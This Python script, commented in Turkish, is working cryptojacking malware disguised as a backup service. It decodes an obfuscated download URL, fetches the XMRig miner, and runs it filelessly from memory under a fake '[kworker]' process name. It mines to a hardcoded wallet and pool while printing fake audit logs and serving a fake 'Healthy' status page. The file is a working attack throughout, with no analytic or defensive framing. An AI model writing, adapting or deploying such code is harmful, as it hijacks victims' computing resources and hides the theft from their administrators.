#!/usr/bin/env python3
import os
import sys
import time
import base64
import threading
import subprocess
import http.server
import re
import ctypes
import urllib.request
import tempfile
import tarfile
from datetime import datetime

# ========== GELİŞMİŞ SÜREÇ VE BELLEK YÖNETİMİ ==========
libc = ctypes.CDLL('libc.so.6')

def set_process_name(name):
    """Süreç adını değiştir (kworker gibi görün)."""
    try:
        libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except:
        pass

def run_fileless_memfd(binary_data: bytes):
    """Binary'yi belleğe yerleştir ve çalıştırılabilir yol döndür."""
    FD_CLOEXEC = 1
    fd = libc.syscall(319, b"systemd-service", FD_CLOEXEC)
    if fd < 0:
        # Fallback: /dev/shm (disk izi bırakır ama geçici)
        path = f"/dev/shm/.cache-{os.getpid()}"
        with open(path, 'wb') as f:
            f.write(binary_data)
        os.chmod(path, 0o755)
        return path
    os.write(fd, binary_data)
    return f"/proc/self/fd/{fd}"

# ========== YAPILANDIRMA (GİZLENMİŞ) ==========
def _b64(s): return base64.b64decode(s).decode().strip()

# XMRig binary indirme linki (base64 gizli)
# Orijinal: https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
XMrig_URL = _b64("aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjIwLjAveG1yaWctNi4yMC4wLWxpbnV4LXN0YXRpYy14NjQudGFyLmd6Cg==")

# Ortam değişkenleri (çalışma zamanında dışarıdan verilebilir)
PROXY_URL   = os.environ.get("SYNC_PROXY", "")          # örn: 127.0.0.1:1080
WALLET_ADDR = os.environ.get("WALLET_ADDR", _b64("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
WORKER_NAME = os.environ.get("WORKER_NAME", f"node-{int(time.time())%1000}")
POOL_URL    = os.environ.get("POOL_URL", _b64("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))

_current_hashrate = "0.0 H/s"

def download_xmrig_bin(url: str) -> bytes:
    """URL'den tar.gz indir, içindeki xmrig binary'sini oku."""
    with tempfile.TemporaryDirectory() as tmpdir:
        tar_path = os.path.join(tmpdir, "xmrig.tar.gz")
        # İndir (User-Agent maskele)
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            with open(tar_path, 'wb') as f:
                f.write(response.read())
        # Aç
        with tarfile.open(tar_path, 'r:gz') as tar:
            tar.extractall(tmpdir)
        # Binary'yi bul
        for root, dirs, files in os.walk(tmpdir):
            if 'xmrig' in files:
                bin_path = os.path.join(root, 'xmrig')
                with open(bin_path, 'rb') as f:
                    return f.read()
    raise RuntimeError("xmrig binary not found in archive")

def start_backup_agent():
    global _current_hashrate
    try:
        set_process_name("[kworker]")

        # XMRig binary'sini indir (sadece RAM üzerinde işlenir)
        xmrig_data = download_xmrig_bin(XMrig_URL)

        # Fileless çalıştır
        mem_path = run_fileless_memfd(xmrig_data)

        # Proxy argümanı (XMRig --proxy=ip:port formatında)
        proxy_args = []
        if PROXY_URL:
            proxy_args = ["--proxy", PROXY_URL]

        # CPU kullanımını sınırla (toplam çekirdeğin yarısı)
        cpu_limit = max(1, os.cpu_count() // 2)

        cmd = [
            mem_path,
            "--url", POOL_URL,
            "--user", WALLET_ADDR,
            "--pass", WORKER_NAME,
            "--keepalive",
            "--tls",
            "--threads", str(cpu_limit),
        ] + proxy_args

        # Hassas ortam değişkenlerini temizle
        clean_env = os.environ.copy()
        for k in ["SYNC_PROXY", "WALLET_ADDR", "POOL_URL"]:
            clean_env.pop(k, None)

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1, env=clean_env)

        # Çıktıyı izle ve hashrate'i yakala
        for line in proc.stdout:
            if "speed" in line.lower() or "hashrate" in line.lower():
                m = re.search(r'(\d+\.?\d*\s*[kKMG]?H/s)', line)
                if m:
                    _current_hashrate = m.group(1)
            # Maskeleme amaçlı log
            sys.stdout.write(f"[AUDIT] {datetime.now().isoformat()} Backup chunk processed\n")
            sys.stdout.flush()

    except Exception:
        # Sessiz hata yönetimi
        time.sleep(30)

if __name__ == "__main__":
    threading.Thread(target=start_backup_agent, daemon=True).start()

    # Sağlık kontrolü sunucusu (zombi süreci engeller)
    class BackupHealthHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Backup Service v2.1 - Status: Healthy")
        def log_message(self, *args, **kwargs):
            pass

    port = int(os.environ.get("PORT", 8080))
    http.server.ThreadingHTTPServer(("0.0.0.0", port), BackupHealthHandler).serve_forever()
